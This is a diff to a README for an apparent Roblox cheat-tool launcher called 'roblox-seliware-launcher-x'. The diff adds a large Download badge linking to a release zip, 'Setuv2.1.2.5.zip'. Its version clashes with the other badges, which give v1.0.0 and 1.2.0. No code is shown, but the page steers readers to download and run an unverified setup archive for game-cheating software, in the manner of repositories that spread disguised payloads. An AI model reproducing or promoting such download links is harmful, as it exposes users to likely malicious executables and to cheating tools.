@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen?style=for-the-badge&logo=windows)](https://github.com/ivantaylor-lab1900d8/roblox-seliware-launcher-x/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 roblox-seliware-launcher-x
 
 ![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/ivantaylor-lab1900d8/roblox-seliware-launcher-x?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/ivantaylor-lab1900d8/roblox-seliware-launcher-x?style=flat-square)
